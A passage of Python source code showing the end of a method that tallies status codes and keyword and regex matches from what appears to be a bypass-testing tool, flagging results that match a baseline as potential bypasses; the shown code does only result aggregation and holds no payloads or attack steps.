            return {'error': 'No results yet'}

        total = len(self.results) - 1  # Exclude baseline
        baseline = self.baseline_result

        # Count by status code
        status_counts = {}
        for r in self.results[1:]:  # Skip baseline
            code = r.status_code
            status_counts[code] = status_counts.get(code, 0) + 1

        # Count keyword matches
        keyword_matches = sum(1 for r in self.results[1:] if r.keyword_match is True)
        regex_matches = sum(1 for r in self.results[1:] if r.regex_match is True)

        # Find potentially successful bypasses
        potential_bypasses = []
        for r in self.results[1:]:
            is_potential = False
            if r.keyword_match is True:
                is_potential = True
            elif r.regex_match is True:
                is_potential = True
            elif baseline and r.status_code == baseline.status_code:
                is_potential = True

            if is_potential and not r.error:
                potential_bypasses.append({
                    'technique': r.technique_name,
                    'status_code': r.status_code,
                    'keyword_match': r.keyword_match,
                    'regex_match': r.regex_match
                })

        return {
            'total_techniques': total,
            'baseline_status': baseline.status_code if baseline else None,
            'baseline_size': baseline.response_size if baseline else None,
            'status_code_distribution': status_counts,
            'keyword_matches': keyword_matches,
            'regex_matches': regex_matches,
            'potential_bypasses': potential_bypasses,
            'potential_bypass_count': len(potential_bypasses),
            'waf_mode': self.enable_waf,
            'payload_mode': self.payload_mode
        }
